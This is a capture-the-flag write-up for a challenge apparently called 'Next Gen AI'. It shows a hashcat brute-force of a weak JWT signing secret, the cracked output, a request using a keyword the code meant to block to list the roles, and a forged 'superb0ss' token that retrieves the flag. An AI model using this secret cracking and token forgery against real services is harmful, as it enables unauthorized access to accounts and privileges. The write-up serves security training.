# Next Gen AI

In the game, we are able to communicate in a chat with a naive AI.
We can notice that a JWT is used to authenticate the user.

Since the JWT was quite short, we tried to crack the hash with hashcat, with `replyhash.txt` :

`8dc06319a53e37d9281d0bd9f2660a98d8b907e40d9824de8db49452ca1d903c:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9`

where before the `:` we have the hash in hex (decode from base64url!) and then the base64url of the JWT.

Command for hashcat:
`./hashcat.bin -m 1450 -a 3 replyhash.txt`

Output of hashcat:
`8dc06319a53e37d9281d0bd9f2660a98d8b907e40d9824de8db49452ca1d903c:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9:chicken`

So the password is `chicken`. Now we are able to forge valid JWT.


By analyzing the code, we see that some keyword were blocked. For example requests with  `text=allroles`in the body.
If we send such a request with body `text=allroles` the response contains the users: `user,superb0ss`.

We can now forge a JWT with `superb0ss` as role:

```
{"typ":"JWT","alg":"HS256"}.
{"role":"superb0ss"}.
HS256("chicken",base64urlencode({"typ":"JWT","alg":"HS256"}).base64urlencode({"role":"superb0ss"}))
```

Which is signed to `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3VwZXJiMHNzIn0.fJCNV7l5CIfHAvWJD93MrKzScH8ne67LcQyB6uycAcg`

By sending a request with this JWT to the server we retrieve the flag:

`{FLG:You4reSm4rt3rTH4nMyAI}`
